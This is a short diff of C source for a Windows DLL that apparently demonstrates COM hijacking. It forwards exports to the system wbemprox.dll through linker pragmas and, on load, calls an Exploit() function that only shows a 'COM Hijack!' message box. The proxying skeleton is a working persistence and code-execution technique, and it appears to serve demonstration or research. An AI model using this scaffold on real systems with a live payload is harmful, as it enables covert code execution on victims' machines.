@@ -8,12 +8,17 @@
 #pragma comment(linker, "/export:DllUnregisterServer=\"C:\\Windows\\System32\\wbem\\wbemprox.Dll.DllUnregisterServer\"")
 #endif
 
+VOID Exploit()
+{
+	MessageBoxA( NULL, "COM Hijack!", "COM Hijacking", MB_OK );
+}
+
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 {
 	switch( dwReason ) 
     {
 		case DLL_PROCESS_ATTACH:
-			MessageBoxA( NULL, "COM Hijack!", "COM Hijacking", MB_OK );
+			Exploit();
 			break;
 		case DLL_PROCESS_DETACH:
             break;
